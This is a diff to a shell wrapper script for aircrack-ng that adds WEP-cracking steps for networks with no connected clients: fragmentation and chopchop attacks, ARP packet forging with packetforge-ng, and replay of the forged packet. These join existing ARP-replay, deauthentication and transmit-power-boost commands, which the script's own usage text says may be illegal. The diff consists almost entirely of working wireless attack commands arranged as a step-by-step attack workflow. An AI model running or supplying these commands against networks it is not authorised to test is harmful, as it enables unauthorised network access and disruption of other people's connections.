@@ -13,11 +13,14 @@ monitor=${wlanif}mon
 [ -e ./aircrack-vars.sh ] && . ./aircrack-vars.sh
 
 [ x$1 = x ] && {
-	echo "usage: $0 [mon|scan|test|dump|assoc|arp(r)|crack(k)|deauth|stopmon|powerup]"
-	echo "run each of the commands in the above order"
+	echo "usage: $0 [mon|scan|test|dump|assoc|arp(r)|crack(k)|chop|frag|farp|forge|farp|deauth|stopmon|powerup]"
+	echo "run each of the commands in the above order until(including crack) to attack WEP with clients"
 	echo "and all of them except the first 2 in an own term"
 	echo "deauth requires as additional parameter the mac of the client"
 	echo "powerup boosts the txpower to 30 mw which can be handy but may be illegal"
+	echo "in case there are no WEP clients, use frag or chop followed by forge+farp instead of arp, then crack"
+	echo "(frag/chop require non-SKA authentication and some data packets (like broadcasts) being sent)"
+	echo "(see https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients for details)"
 	exit 1
 }
 
@@ -60,9 +63,27 @@ monitor=${wlanif}mon
 
 }
 
+#fragmentation attack
+[ x$1 = xfrag ] && {
+	shift
+	aireplay-ng -5 -b $ap_mac -h $ownmac $monitor "$@"
+}
+#chop chop
+[ x$1 = xchop ] && {
+	shift
+	aireplay-ng -4 -b $ap_mac -h $ownmac $monitor "$@"
+}
+#forge arp
+[ x$1 = xforge ] && {
+	shift
+	packetforge-ng -0 -a $ap_mac -h $ownmac -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w arp-request
+}
+
+#replay forged arp
+[ x$1 = xfarp ] && aireplay-ng -2 -r arp-request $monitor
+
 # arp attack
 [ x$1 = xarp ] && aireplay-ng -3 -b $ap_mac -h $ownmac $monitor
-
 # if you already captured an arp packet in a previous run
 if [ x$1 = xarpr ] ; then
 	repl=
